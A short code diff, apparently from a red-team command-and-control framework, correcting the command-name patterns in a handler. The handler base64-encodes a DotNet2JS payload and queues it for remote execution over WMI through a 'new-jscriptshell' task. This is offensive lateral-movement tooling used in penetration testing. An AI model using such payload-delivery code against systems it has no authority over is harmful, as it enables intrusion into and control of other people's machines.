@@ -239,7 +239,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             with open("%s%sDotNet2JS.js" % (PayloadsDirectory, "Proxy"), "r") as p:
                 payload = p.read()
             payload = base64.b64encode(payload.encode('UTF-8'))
-            params = re.compile("invoke-wmiproxyjspayload ", re.IGNORECASE)
+            params = re.compile("invoke-wmijsproxypayload ", re.IGNORECASE)
             params = params.sub("", command)
             new_task("$Payload=\"%s\"" % (payload.decode('utf-8')), user, randomuri)
             cmd = "new-jscriptshell %s -payload $Payload" % (params)
@@ -254,7 +254,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             with open("%s%sDotNet2JS.js" % (PayloadsDirectory, daisyname), "r") as p:
                 payload = p.read()
             payload = base64.b64encode(payload.encode('UTF-8'))
-            params = re.compile("invoke-wmiproxyjspayload ", re.IGNORECASE)
+            params = re.compile("invoke-wmijsdaisypayload ", re.IGNORECASE)
             params = params.sub("", command)
             new_task("$Payload=\"%s\"" % (payload.decode('utf-8')), user, randomuri)
             cmd = "new-jscriptshell %s -payload $Payload" % (params)
